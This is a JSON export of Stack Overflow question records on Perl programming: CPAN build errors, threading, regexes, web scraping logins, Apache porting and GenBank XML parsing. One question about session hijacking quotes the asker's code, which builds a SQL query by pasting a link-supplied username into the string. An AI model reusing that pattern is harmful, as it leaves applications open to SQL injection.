but it says:</p>\n\n<blockquote>\n  <p>By default, CJK Unified Ideographs are\n  ordered in Unicode codepoint order...</p>\n</blockquote>\n\n<p>If I could get a database of stroke count per character, I could easily sort all of the characters, but this doesn't seem to come with Perl nor is it encapsulated in any module I could find.</p>\n\n<p>If you know how to sort CJK in other languages, it would be helpful to mention it in an answer to this question.</p>\n"},{"tags":["perl","stack","pop"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":65,"score":-1,"question_id":12707435,"title":"Pop out the stack on satisfying a condition in perl","body":"<pre><code>#!/usr/local/bin/perl\nsub parser\n    {   \n        while(&lt;SRCFILE&gt; )\n            {\n                if(!eof LOGFILE)\n                {\n                    print \"Something\";\n                    parser();\n                }\n                else \n                {\n                    **Discard Everything in stack**\n                }\n            }\n    }\n\nopen (LOGFILE, 'out.txt');\nopen (SRCFILE , 'a.txt');\nparser();\n</code></pre>\n\n<p>I want to empty the stack at 'else' . I tried using <code>exit</code> but the execution just stops there popping nothing.</p>\n\n<p><strong>EDIT</strong> :\nI have changed my requirement a bit.</p>\n"},{"tags":["mysql","osx","perl","dbd"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":11738757,"title":"Does installing Perl DBD-mysql-4.021 need MySQL header on MacOs Lion?","body":"<p>I try to install DBD-mysql-4.021 on MacOS Lion, but it seems when I do, it misses some header file.</p>\n\n<pre><code>MacBook-Pro-de-benoit:DBD-mysql-4.021-XXi0wV vanalder$ sudo make \nllvm-gcc-4.2 -c -I/Library/Perl/5.12/darwin-thread-multi-2level/auto/DBI -I/Applications/MAMP/Library/include -fno-omit-frame-pointer  -g -DDBD_MYSQL_INSERT_ID_IS_GOOD -g  -arch x86_64 -arch i386 -g -pipe -fno-common -DPERL_DARWIN -fno-strict-aliasing -fstack-protector -I/usr/local/include -Os   -DVERSION=\\\"4.021\\\" -DXS_VERSION=\\\"4.021\\\"  \"-I/System/Library/Perl/5.12/darwin-thread-multi-2level/CORE\"   dbdimp.c In file included from dbdimp.c:20: \ndbdimp.h:24:49: error: mysql.h: No such file or directory \ndbdimp.h:25:45: error: mysqld_error.h: No such file or directory \ndbdimp.h:27:49: error: errmsg.h: No such file or directory In file included from dbdimp.c:20: dbdimp.h:159: error: expected specifier-qualifier-list before âMYSQLâ dbdimp.h:257: error: expected specifier-qualifier-list before âMYSQL_RESâ In file included from dbdimp.c:20:\n....\n</code></pre>\n\n<p>I tried installing binaries of MySQL from <a href=\"http://www.opensource.apple.com/\" rel=\"nofollow\">here</a>. I can install but it doesn't work. Or install it with macports (mysql5-devel -> cannot install), what should I do to use MySQL with Perl?</p>\n\n<hr>\n\n<p>I installed again mysql from a DMG from this link [http://www.mysql.com/downloads/mysql/][1]http://www.mysql.com/downloads/mysql/ \nbut i still have the same error when i make </p>\n\n<pre><code>sudo make\n\ndbdimp.h:24:49: error: mysql.h: No such file or directory\ndbdimp.h:25:45: error: mysqld_error.h: No such file or directory\ndbdimp.h:27:49: error: errmsg.h: No such file or directory\nIn file included from dbdimp.c:20:\ndbdimp.h:159: error: expected specifier-qualifier-list before âMYSQLâ\ndbdimp.h:257: error: expected specifier-qualifier-list before âMYSQL_RESâ\nIn file included from dbdimp.c:20:\n....\n</code></pre>\n\n<p>It's the first time i  have trouble to install a CPAN module (Xcode install and a GCC compiler k)</p>\n"},{"tags":["perl","file-handling","file-handles"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":86,"score":3,"question_id":12702869,"title":"How severe is it if we do not close a file in Perl?","body":"<p>How severe is it if we do not close a file in Perl?\nWill it affect the program or file if I access it again in the same program?</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12706311,"title":"Comparison of <init> using Regex in perl","body":"<p>I am extracting line by line from a file and splitting into words.\nI want all the words except the words enclosed between '&lt;' and '>'.</p>\n\n<pre><code>        if($word =~ m/^(\\&lt;).*(\\&gt;)$/)\n            {\n                 print \"Remove this word\";\n            }\n</code></pre>\n\n<p>I tried the above code.But its not working.</p>\n\n<p>This is the file I'm processing :</p>\n\n<pre><code>#&gt; main bcel_coverage.A    \n#&gt; &lt;init&gt; bcel_coverage.C\n&lt;# &lt;init&gt;\n   ?? main\nabc\n&lt;# main\n</code></pre>\n\n<p>I do not want <code>&lt;init&gt;</code> in the above file to be printed. Anything else can also be enclosed within '&lt;' and '>'.</p>\n"},{"tags":["perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":39,"score":-1,"question_id":12697603,"title":"Perl XML Create having wrong node","body":"<p>I have a hash of hashes and want to put them in XMLOut.</p>\n\n<pre><code>'rp' =&gt; {\n           'tr' =&gt; {\n                'tsu' =&gt; {\n                    'ct' =&gt; {\n                        'data' =&gt; \"1\"\n</code></pre>\n\n<p>What happens is that XMLout is putting each other in its own <code>&lt;name&gt;&lt;/name&gt;</code> node:</p>\n\n<pre><code>&lt;rp&gt;\n   &lt;name&gt;tr&lt;/name&gt;\n      &lt;tsu&gt;\n          &lt;name&gt;ct&lt;/name&gt;\n          &lt;data&gt;1&lt;/data&gt;\n</code></pre>\n\n<p>Why is this happening?</p>\n"},{"tags":["perl","environment-variables"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":81,"score":-2,"question_id":12364506,"title":"using export and perl -c in perl scripting","body":"<p>Since export cannot be used with a Perl script I've used the environment variable. </p>\n\n<p>This code doesn't return any error but the command <code>perl -c</code> to check the syntax of the .pm file does not print the output. </p>\n\n<pre><code>myscript.pl\n\n$ENV{'PATH'}='C:/Users/abc/Desktop/mno/wwwww/scripts/lib/perl/';\n\nsystem(\"perl -c ContentModifySeasonPassOverlayRecord.pm\");\n</code></pre>\n"},{"tags":["osx","perl","git","svn","macports"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":12700194,"title":"git svn clone fails on Mac OS X: \"Temp file with moniker 'svn_delta' already in use\"","body":"<p>I've installed git-core (+svn) on my Mac from MacPorts.  This has given me:</p>\n\n<pre><code>git-core @1.7.12.2_0+credential_osxkeychain+doc+pcre+python27+svn\nsubversion @1.7.6_2 \n</code></pre>\n\n<p>I'm attempting to call something like the following:</p>\n\n<pre><code>git svn clone http://my.svn.com/svn/area/subarea/project -s\n</code></pre>\n\n<p>The output looks something like this: </p>\n\n<pre><code>Initialized empty Git repository in /Users/bitwise/work/svn/project/.git/\nUsing higher level of URL: http://my.svn.com/svn/area/subarea/project =&gt; http://my.svn.com/svn/area\nA   folder/file.txt\n    A       folder/file2.txt\n   [... some number of files from svn ... ]\n    A       folder44/file0.txt\nTemp file with moniker 'svn_delta' already in use at /opt/local/lib/perl5/site_perl/5.12.4/Git.pm line 1024.\n</code></pre>\n\n<p>I've done the usual searches but most of the threads seem to trail off without proposing a clear fix.</p>\n"},{"tags":["perl","www-mechanize","www-authenticate"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":72,"score":1,"question_id":12700379,"title":"Login to Java site with WWW::Scripter charset issue","body":"<p>I'm trying to login to a java website using WWW::Scripter module.  Using the WWW::Mechanize module works fine, but once authenticated the site has JavaScript functions that I need to call - hence needing Scripter.  </p>\n\n<p>After doing a large amount of troubleshooting I have found that the difference in packets sent from the click() event are  the Content-Type varaibale.<br>\nMechanize has:\n Content-Type: application/x-www-form-urlencoded\\r\\n \nbut Scripter has: \n Content-Type: application/x-www-form-urlencoded; charset=\"ISO-8859-1\"\\r\\n\n(This is viewed using WireShark)</p>\n\n<p>This explains the error I am receiving from the website which is:</p>\n\n<blockquote>\n  <p>error message: \"ISO-8859-1\" error stack trace:\n  java.nio.charset.IllegalCharsetNameException: \"ISO-8859-1\"\n          at java.nio.charset.Charset.checkName(Charset.java:305)\n          at java.nio.charset.Charset.lookup(Charset.java:439)\n          at java.nio.charset.Charset.forName(Charset.java(Inlined Compiled Code))</p>\n\n<pre><code>    at java.lang.StringCoding$DecoderCache.makeDecoder(StringCoding.java(Com\n</code></pre>\n  \n  <p>piled Code))\n          at java.lang.StringCoding$1.run(StringCoding.java(Compiled Code))\n          at java.security.AccessController.doPrivileged1(Native Method)\n          at java.security.AccessController.doPrivileged(AccessController.java(Com\n  piled Code))\n          at java.lang.StringCoding$DecoderCache.getDecoder(StringCoding.java(Comp\n  iled Code))\n          at java.lang.StringCoding.getDecoder(StringCoding.java(Inlined Compiled Code))\n          at java.lang.StringCoding.decode(StringCoding.java(Compiled Code))\n          at java.lang.String.(String.java(Compiled Code))\n          at java.lang.String.(String.java(Inlined Compiled Code))\n          at com.ibm.ws.webcontainer.servlet.RequestUtils.parsePostData(RequestUti\n  ls.java(Compiled Code))\n          at com.ibm.ws.webcontainer.srt.SRTServletRequest.parseParameters(SRTServ\n  letRequest.java(Compiled Code))\n          at com.ibm.ws.webcontainer.srt.SRTServletRequest.getParameterNames(SRTSe\n  rvletRequest.java(Compiled Code))\n          at javax.servlet.ServletRequestWrapper.getParameterNames(ServletRequestW\n  rapper.java(Compiled Code))\n          at org.apache.struts.util.RequestUtils.populate(RequestUtils.java(Compil\n  ed Code))\n          at org.apache.struts.action.RequestProcessor.processPopulate(RequestProc\n  essor.java(Compiled Code))\n          at org.apache.struts.action.RequestProcessor.process(RequestProcessor.ja\n  va(Compiled Code))\n          at org.apache.struts.action.ActionServlet.process(ActionServlet.java(Inl\n  ined Compiled Code))\n          at org.apache.struts.action.ActionServlet.doPost(ActionServlet.java(Comp\n  iled Code))\n          at javax.servlet.http.HttpServlet.service(HttpServlet.java(Compiled Code\n  ))\n          at javax.servlet.http.HttpServlet.service(HttpServlet.java(Compiled Code\n  ))\n          at com.ibm.ws.webcontainer.servlet.StrictServletInstance.doService(Stric\n  tServletInstance.java(Compiled Code))\n          at com.ibm.ws.webcontainer.servlet.StrictLifecycleServlet._service(Stric\n  tLifecycleServlet.java(Compiled Code))\n          at com.ibm.ws.webcontainer.servlet.IdleServletState.service(StrictLifecy\n  cleServlet.java(Compiled Code))\n          at com.ibm.ws.webcontainer.servlet.StrictLifecycleServlet.service(Strict\n  LifecycleServlet.java(Inlined Compiled Code))\n          at com.ibm.ws.webcontainer.servlet.ServletInstance.service(ServletInstan\n  ce.java(Compiled Code))\n          at com.ibm.ws.webcontainer.servlet.ValidServletReferenceState.dispatch(V\n  alidServletReferenceState.java(Compiled Code))\n          at com.ibm.ws.webcontainer.servlet.ServletInstanceReference.dispatch(Ser\n  vletInstanceReference.java(Inlined Compiled Code))\n          at com.ibm.ws.webcontainer.filter.WebAppFilterChain.doFilter(WebAppFilte\n  rChain.java(Compiled Code))\n          at com.infostream.web.filters.HibernateSessionFilter.doFilter(HibernateS\n  essionFilter.java(Compiled Code))\n          at com.ibm.ws.webcontainer.filter.FilterInstanceWrapper.doFilter(FilterI\n  nstanceWrapper.java(Compiled Code))\n          at com.ibm.ws.webcontainer.filter.WebAppFilterChain.doFilter(WebAppFilte\n  rChain.java(Compiled Code))\n          at com.infostream.web.filters.IdentificationFilter.doFilter(Identificati\n  onFilter.java(Compiled Code))\n          at com.ibm.ws.webcontainer.filter.FilterInstanceWrapper.doFilter(FilterI\n  nstanceWrapper.java(Compiled Code))\n          at com.ibm.ws.webcontainer.filter.WebAppFilterChain.doFilter(WebAppFilte\n  rChain.java(Compiled Code))\n          at com.ibm.ws.webcontainer.webapp.WebAppRequestDispatcher.handleWebAppDi\n  spatch(WebAppRequestDispatcher.java(Compiled Code))\n          at com.ibm.ws.webcontainer.webapp.WebAppRequestDispatcher.dispatch(WebAp\n  pRequestDispatcher.java(Compiled Code))\n          at com.ibm.ws.webcontainer.webapp.WebAppRequestDispatcher.forward(WebApp\n  RequestDispatcher.java(Compiled Code))\n          at com.ibm.ws.webcontainer.srt.WebAppInvoker.doForward(WebAppInvoker.jav\n  a(Compiled Code))\n          at com.ibm.ws.webcontainer.srt.WebAppInvoker.handleInvocationHook(WebApp\n  Invoker.java(Compiled Code))\n          at com.ibm.ws.webcontainer.cache.invocation.CachedInvocation.handleInvoc\n  ation(CachedInvocation.java(Compiled Code))\n          at com.ibm.ws.webcontainer.cache.invocation.CacheableInvocationContext.i\n  nvoke(CacheableInvocationContext.java(Compiled Code))\n          at com.ibm.ws.webcontainer.srp.ServletRequestProcessor.dispatchByURI(Ser\n  vletRequestProcessor.java(Compiled Code))\n          at com.ibm.ws.webcontainer.oselistener.OSEListenerDispatcher.service(OSE\n  Listener.java(Compiled Code))\n          at com.ibm.ws.webcontainer.http.HttpConnection.handleRequest(HttpConnect\n  ion.java(Compiled Code))\n          at com.ibm.ws.http.HttpConnection.readAndHandleRequest(HttpConnection.ja\n  va(Compiled Code))\n          at com.ibm.ws.http.HttpConnection.run(HttpConnection.java(Compiled Code)\n  )\n          at com.ibm.ws.util.ThreadPool$Worker.run(ThreadPool.java(Compiled Code))</p>\n</blockquote>\n\n<p>The code I'm using to test the login is:</p>\n\n<pre><code>#!/usr/bin/perl -w\n\nuse WWW::Scripter;\n\nmy $urlLogin = \"XXX\";\n\nmy $viper = WWW::Scripter-&gt;new();\n\n$viper-&gt;use_plugin('JavaScript');\n\n$viper-&gt;get($urlLogin);\n\n$viper-&gt;form_name('loginForm');\n\n$viper-&gt;field(username =&gt; \"xxx\");\n$viper-&gt;field(password =&gt; \"xxx\");\n\n$viper-&gt;click();\n</code></pre>\n\n<p>As mentioned before this works fine if I use WWW::Mechanize instead of WWW::Scripter.</p>\n\n<p>Can anyone suggest what I can do to remove the charset field in the Content-Type of the packet being POST'ed.</p>\n"}]}
{"total":22324,"page":13,"pagesize":100,"questions":[{"tags":["regex","perl"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":158,"score":-2,"question_id":9754299,"title":"Matching the rightmost and the leftmost symbols in perl with regular expression","body":"<p>I'm trying to match a string such that the leftmost symbol and the rightmost symbol are the same. How do I do that?</p>\n"},{"tags":["perl","hash"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":100,"score":1,"question_id":12304390,"title":"Printing keys based on Hash values in Perl","body":"<p>I need to print keys based on vales in hash. Here is the code, I wrote</p>\n\n<pre><code>foreach $value (values %hash)\n{\n    print \"$value\\t$hash{$value}\\n\";\n}\n</code></pre>\n\n<p>Error: I can only print values, but not keys.</p>\n\n<p>Any help will be greatly appreciated.</p>\n\n<p>Thanks</p>\n"},{"tags":["perl"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":70,"score":0,"question_id":12699088,"title":"Perl add delimiter and remove last one","body":"<p>I have file with few lines, I want combine all lines with delimiter and remove the last one.</p>\n\n<p>Its not working with perl. but working with sed. can you help to make this work with perl?</p>\n\n<pre><code> cat a\na\nb\nc\nd\n\n cat a |perl -lane 'printf(\"%s|\",$_)' |perl -lane 's/|$//;print'\na|b|c|d|\n\n cat a |perl -lane 'printf(\"%s|\",$_)' |sed 's/|$//'\na|b|c|d\n</code></pre>\n"},{"tags":["perl","awstats"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12698851,"title":"AWStats update crashes perl","body":"<p>I have been working to move an AWStats instance to a new server.\nServer is running Windows Server 2008\nAWStats version is 7.0\nPerl64 version is 5.16.1</p>\n\n<p>I received the error \"Never updated (See 'Build/Update' on awstats_setup.html page)\", for which the instructions told me to run this Perl script:</p>\n\n<pre><code>perl awstats.pl -config=ServerName -update\n</code></pre>\n\n<p>The result is \"Perl Command Line Interpreter has stopped working\" with an Exception Code of c0000005 and nothing meaningful in the problem details.</p>\n\n<p>How do I prevent the error and allow this to run?</p>\n"},{"tags":["perl","session","cgi"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":73,"score":2,"question_id":12683469,"title":"How to prevent session hijacking with a user's session in CGI Perl?","body":"<p>I have a web app used by a small number of people (internal only) and am using a randomised sessionID that is stored under the user record and placed in various links.</p>\n\n<p>I have had a problem where users are sending links to each other which is allowing them to hijack the sender's session.</p>\n\n<p>What are some ways of preventing this from happening while still letting users send links to one another?</p>\n\n<p>Edit:\nThe session ID in the link (which also contains $username) is just compared to what is stored in the User table. &amp;incorrectLogin just prints an error followed by die;</p>\n\n<pre><code>if ($sid) {\n\n    $sth = $dbh-&gt;prepare(\"SELECT * FROM tbl_User WHERE UserID = '$username'\");\n    $sth-&gt;execute();\n\n    $ref         = $sth-&gt;fetchrow_hashref();\n    $session_chk = $ref-&gt;{'usr_sessionID'};\n\n    unless ($sid eq $session_chk) {\n\n        &amp;incorrectLogin;\n    }\n}\n</code></pre>\n\n<p>The problem is that if someone uses a link that is created by someone else, the page will load as them. I am not using cookies, and I recall being told in the past that CGI perl cookie handling is quite poor.</p>\n"},{"tags":["perl","email"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":205,"score":-5,"question_id":7359640,"title":"How do I send emails using a Perl script","body":"<p>This is for my last exam, so i would be very grateful if someone helped me.</p>\n\n<p>I've been told to write Perl script for sending e-mails to many users. \nIt`s supposed to work like this: </p>\n\n<p>1) The script reads an .html document that is supposed to be the body of the email. </p>\n\n<p>2) It reads .txt document that contains all the e-mail addresses (divided by \";\") that the email should be sent to. There may be hundreds, thousands e-mail addresses. </p>\n\n<p>3) The script should somehow read the SMTP settings for sending the e-mail. </p>\n\n<p>I`m looking forward to anyone's answer. </p>\n\n<p>Thanks in advance...</p>\n"},{"tags":["multithreading","perl","filehandle"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":1,"view_count":66,"score":-1,"question_id":12696375,"title":"perl share filehandle with threads","body":"<p>I've found the code below online, it seems the way the program control the loop is to check the shared variable $TERM is 0 or not. Can I share a filehandle between threads, that every thread deal with one line of a file and loop ends when the file reaches the last line? </p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nuse threads 1.39;\nuse threads::shared;\nuse Thread::Queue;\n\n### Global Variables ###\n\n# Maximum working threads\nmy $MAX_THREADS = 10;\n\n# Flag to inform all threads that application is terminating\nmy $TERM :shared = 0;\n\n# Threads add their ID to this queue when they are ready for work\n# Also, when app terminates a -1 is added to this queue\nmy $IDLE_QUEUE = Thread::Queue-&gt;new();\n\n\n### Signal Handling ###\n\n# Gracefully terminate application on ^C or command line 'kill'\n$SIG{'INT'} = $SIG{'TERM'} =\n    sub {\n        print(\"&gt;&gt;&gt; Terminating &lt;&lt;&lt;\\n\");\n        $TERM = 1;\n        # Add -1 to head of idle queue to signal termination\n        $IDLE_QUEUE-&gt;insert(0, -1);\n    };\n\n\n### Main Processing Section ###\nMAIN:\n{\n    ### INITIALIZE ###\n\n    # Thread work queues referenced by thread ID\n    my %work_queues;\n\n    # Create the thread pool\n    for (1..$MAX_THREADS) {\n        # Create a work queue for a thread\n        my $work_q = Thread::Queue-&gt;new();\n\n        # Create the thread, and give it the work queue\n        my $thr = threads-&gt;create('worker', $work_q);\n\n        # Remember the thread's work queue\n        $work_queues{$thr-&gt;tid()} = $work_q;\n    }\n\n\n    ### DO WORK ###\n\n    # Manage the thread pool until signalled to terminate\n    while (! $TERM) {\n        # Wait for an available thread\n        my $tid = $IDLE_QUEUE-&gt;dequeue();\n\n        # Check for termination condition\n        last if ($tid &lt; 0);\n\n        # Give the thread some work to do\n        my $work = 5 + int(rand(10));\n        $work_queues{$tid}-&gt;enqueue($work);\n    }\n\n\n    ### CLEANING UP ###\n\n    # Signal all threads that there is no more work\n    $work_queues{$_}-&gt;enqueue(-1) foreach keys(%work_queues);\n\n    # Wait for all the threads to finish\n    $_-&gt;join() foreach threads-&gt;list();\n}\n\nprint(\"Done\\n\");\nexit(0);\n\n\n### Thread Entry Point Subroutines ###\n\n# A worker thread\nsub worker\n{\n    my ($work_q) = @_;\n\n    # This thread's ID\n    my $tid = threads-&gt;tid();\n\n    # Work loop\n    do {\n        # Indicate that were are ready to do work\n        printf(\"Idle     -&gt; %2d\\n\", $tid);\n        $IDLE_QUEUE-&gt;enqueue($tid);\n\n        # Wait for work from the queue\n        my $work = $work_q-&gt;dequeue();\n\n        # If no more work, exit\n        last if ($work &lt; 0);\n\n        # Do some work while monitoring $TERM\n        printf(\"            %2d &lt;- Working\\n\", $tid);\n        while (($work &gt; 0) &amp;&amp; ! $TERM) {\n            $work -= sleep($work);\n        }\n\n        # Loop back to idle state if not told to terminate\n    } while (! $TERM);\n\n    # All done\n    printf(\"Finished -&gt; %2d\\n\", $tid);\n}\n</code></pre>\n"},{"tags":["perl","apache","apache2","porting"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12695293,"title":"Apache2::Const qw() equivalent for Apache::Constants qw(:common :response)","body":"<p>I'm still banging my head against the wall with attempting to port a legacy perl application from Apache 1.3.x (and who really knows what version of perl) to RHEL6...which is Apache 2.2.x / perl 5.10.x</p>\n\n<p>At any rate, if there is anyone that knows the equivalent for</p>\n\n<pre><code>use Apache::Constants qw(:common :response);\n</code></pre>\n\n<p>... needs to be refactored to use Apache2 ...</p>\n\n<pre><code>use Apache2::Const qw(:common :response);  &lt;--This is _not_ correct.\n</code></pre>\n\n<p>it looks like there is :common, but :response throws the error: \"unknown apache2_const:: group `response'\"</p>\n\n<p>Also, if anyone can \"teach a man to fish\" here, it would be appreciated.</p>\n"},{"tags":["perl","search-engine","bing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12695542,"title":"Bing API Authentication in Perl","body":"<p>I am trying to use the Bing's Search API to fetch results however authentication is not working properly.</p>\n\n<p>Here's the code I have written:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse warnings;\nuse WWW::Mechanize;\nuse Crypt::SSLeay;\n\n$mech = WWW::Mechanize-&gt;new();\n$url  = \"https://api.datamarket.azure.com/Bing/SearchWeb/Web?Query=%27Xbox%27&amp;$top=10&amp;$format=JSON\";\n\n$account_key = \"&lt;my key&gt;\";\n$mech-&gt;credentials($url, '', '', $account_key);\n\n$mech-&gt;get($url);\n\nprint $mech-&gt;content();\n</code></pre>\n\n<p>Error: \"The authorization type you provided is not supported.  Only Basic and OAuth are supported\".</p>\n\n<p>If I open the URL in browser, it is a Basic Pop Authentication with no Realm, the username should be blank and the password is the account key. I am able to view the JSON response.</p>\n\n<p>However, when I try to connect from the Perl Script it does not work due to authentication issues.</p>\n\n<p>I think my syntax for passing the credentials in the request is correct. Please let me know if there is a correction to be made to make it work.</p>\n"},{"tags":["perl","html-parsing"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":89,"score":1,"question_id":12675034,"title":"Using Perl, how can I remove the contents of a specific tag in an HTML document?","body":"<p>I'm new to Perl. I have to find and replace in multiple line. </p>\n\n<pre><code>$content =~ s/&lt;picture[^&gt;]*&gt;(.*?)&lt;\\/picture&gt;//gis;\n</code></pre>\n\n<p>I tried these code. All the tags are replaced in my file. What is my mistake any one help me?</p>\n\n<p>My tag is,</p>\n\n<pre><code>&lt;picture width='960' height='705' baseline='360'&gt;\n    &lt;pict-header&gt;\n    &lt;/pict-header&gt;\n&lt;/picture&gt;\n</code></pre>\n\n<p>now replaced by</p>\n\n<pre><code>&lt;picture&gt;&lt;/picture&gt; \n</code></pre>\n"},{"tags":["c","perl","die","backtrace","carp"],"answer_count":4,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":363,"score":7,"question_id":1586709,"title":"Is there a C equivalent for Perl's Carp module?","body":"<p>In some projects I've done in C, I've liked using the following macros which work similar to Perl's warn and die subroutines:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\n#define warn(...) \\\n    fprintf(stderr, __VA_ARGS__); \\\n    fprintf(stderr, \" at %s line %d\\n\", __FILE__, __LINE__)\n\n#define die(...) \\\n    warn(__VA_ARGS__); \\\n    exit(0xFF)\n</code></pre>\n\n<p>Does anything exist like Perl's carp, croak, cluck, and confess subroutines from <a href=\"http://perldoc.perl.org/Carp.html\" rel=\"nofollow\">Carp</a>? I'd like to have something to report errors from the users perspective.</p>\n\n<p>If not, I know there are backtrace() and backtrace_symbols() functions in glibc that along with the -rdynamic gcc option can supply me with a backtrace of function names and code addresses. But i want something a little better; with access to file, line, and function names in the call stack like Perl's caller subroutine. with that I'd be able to write my own libcarp for use in my c programs.</p>\n\n<p>EDIT: 2009-10-19</p>\n\n<p>I'm thinking of creating something that uses gdb when available on basename(argv[0]), then processes the stack trace to produce the different types of messages I want. It should be able to determine if im not in a debuggable executable, or a system without gdb, in which case, carp and cluck will become warns and craok and confess will become dies.</p>\n\n<p>Ive never used gdb like this before (Ive only run it with my program at the beginning, not while its already running). But I found a few functions in glib (g_on_error_stack_trace and stack_trace) that looks very close to what i want to do: It forks a gdb process with the arguments basename(argv[0]) and the process id, then writes to its stdin (which has been redirected to a pipe) the command \"backtrace\" followed by a \"quit\". It then reads from its result and parses it the way it likes. This is almost exactly what i need to do.</p>\n"},{"tags":["php","perl","cgi"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":3,"view_count":41,"score":-3,"question_id":12695155,"title":"Embedded HEX files in PHP","body":"<p>Is it possible to write a virtual HEX file into a PHP page, and later generate the real file on the fly when the user requests the php page?</p>\n\n<p>For example in Perl I use <code>__DATA__</code> followed by some HEX content</p>\n"},{"tags":["perl","shell","expression"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12682541,"title":"Replacing newlines in a record by using Perl or shell script","body":"<p>I need to remove newlines in a field of a text file. For example:</p>\n\n<p>input file looks like:</p>\n\n<pre><code>\"user1\",\"John\",\"Doe\",\"123 a street,\nSan Francisco,\nCA, 94089\"\n\"user2\",\"Foo\",\"Bar\",\"123 x rd., San Jose, CA 95129\"\n...\n</code></pre>\n\n<p>How do I remove the newlines in the first record?</p>\n"},{"tags":["perl","cpan"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12694359,"title":"I keep getting failures installing modules at BEGIN { plan tests => 5 }. What do I need to get past this?","body":"<p>The module it's failing to install is JSON::XS. Really it's failing to install anything \nthat has the following code:</p>\n\n<pre><code>BEGIN { plan tests =&gt; 5 };\n</code></pre>\n\n<p>From the build.log:</p>\n\n<pre><code>syntax error at t/04_dwiw_encode.t line 13, near \"plan tests\"\n</code></pre>\n\n<p>The offending line:</p>\n\n<pre><code> 13     BEGIN { plan tests =&gt; 5 }             \n</code></pre>\n\n<p>I read that there's a problem with Test.pm but there are quite a few modules\nusing it and furthermore this just started happening recently.</p>\n\n<p>I just tried reinstalling perlbrew and also tried updating outdated modules\nbut I keep getting the same failures.</p>\n\n<p>Any one have an idea what might have caused this and how to fix it?</p>\n"},{"tags":["perl","parsing","text"],"answer_count":2,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":386,"score":0,"question_id":7731907,"title":"Parsing an XML file line by line","body":"<p>So here is the issue.  I am trying to parse a XML file of information from GenBank.  This file contains information on multiple DNA sequences.  I have this done already for two other xml formats from genbacnk (TINY xml and INSD xml), but pure xml gives me a headache.  Here's how my program should work.  Download an xml formated file that contains information on X number of sequences from GenBank.  Run my perl script that searches through that xml file line by line and prints the information I want to a new file, in fasta format.  Which is this:  >Sequence_name_and_information\\n sequences\\n >sequence_name.... and on and on until you have all the sequences from the xml file.  My issue though is that in pure xml  the sequence itself comes before the identifier for the gene or locus of the sequences.  The gene or locus of the sequences should go in the same line as the \">\".  Here is the code I have from the point of opening the file and parsing through it:  </p>\n\n<pre><code>open( New_File, \"+&gt;$PWD_file/$new_file\" ) or die \"\\n\\nCouldn't create file. Check permissions on location.\\n\\n\";\n\n    while ( my $lines = &lt;INSD&gt; ) {\n        foreach ($lines) {\n            if (m/&lt;INSDSeq_locus&gt;.*&lt;\\/INSDSeq_locus&gt;/) {\n                $lines =~ s/&lt;INSDSeq_locus&gt;//g and $lines =~ s/&lt;\\/INSDSeq_locus&gt;//g and $lines =~ s/[a-z, |]//g; #this last bit may cause a bug of removing the letters in the genbank accession number\n                $lines =~ s/ //g;\n                chomp($lines);\n                print New_File \"&gt;$lines\\_\";\n            } elsif (m/&lt;INSDSeq_organism&gt;.*&lt;\\/INSDSeq_organism&gt;/) {\n                $lines =~ s/&lt;INSDSeq_organism&gt;//g and $lines =~ s/&lt;\\/INSDSeq_organism&gt;//g;\n                $lines =~ s/(\\.|\\?|\\-| )/_/g;\n                $lines =~ s/_{2,}/_/g;\n                $lines =~ s/_{1,}$//;\n                $lines =~ s/^&gt;*_{1,}//; \n                $lines =~ s/\\s{2}//g;\n                chomp($lines);\n                print New_File \"$lines\\n\";\n            } elsif (m/&lt;INSDSeq_sequence&gt;.*&lt;\\/INSDSeq_sequence&gt;/) {\n                $lines =~ s/&lt;INSDSeq_sequence&gt;//g and $lines =~ s/&lt;\\/INSDSeq_sequence&gt;//g;\n                $lines =~ s/ //g;\n                chomp($lines);\n                print New_File \"$lines\\n\";\n            }\n        }\n    }\n    close INSD;\n    close New_File;\n}\n</code></pre>\n\n<p>There are two places to find Gene/locus information.  That info is found between either on of these two tags: LOCUS_NAME or GENE_NAME.  There will be one, or the other.  If one has info the other will be empty.  In either case both need to be added to the end of the >....... line.  </p>\n\n<p>Thanks,</p>\n\n<p>AlphaA</p>\n\n<p>PS--I tried to print that info to a \"file\" by doing open \"$NA\", \">\" the sequence to that, then moving on with the program, finding the gene info, printing it to the > line and then read the $NA file and printing it to the line right after the > line.  I hope this is clear.  